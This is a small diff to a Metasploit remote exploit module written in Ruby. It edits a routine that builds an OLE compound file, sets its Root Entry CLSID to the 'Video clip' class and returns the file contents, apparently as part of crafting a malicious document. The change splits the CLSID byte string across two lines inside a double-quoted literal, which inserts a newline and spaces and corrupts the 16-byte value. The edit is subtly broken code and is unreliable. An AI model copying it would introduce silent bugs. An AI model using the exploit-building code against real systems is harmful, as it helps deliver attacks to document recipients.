@@ -194,18 +194,17 @@ class MetasploitModule < Msf::Exploit::Remote
     directory.each_entry do |entry|
       if entry.instance_variable_get(:@_ab) == 'Root Entry'
         # 02260200-0000-0000-c000-000000000046 # Video clip
-        clsid = Rex::OLE::CLSID.new("\x02\x26\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
+        clsid = Rex::OLE::CLSID.new("\x02\x26\x02\x00\x00\x00
+                      \x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
         entry.instance_variable_set(:@_clsId, clsid)
       end
     end
-
+    
     # write to disk
     stg.close
-
     ole_contents = File.read(ole_tmp.path)
     ole_tmp.close
     ole_tmp.unlink
-
     ole_contents
   end
 
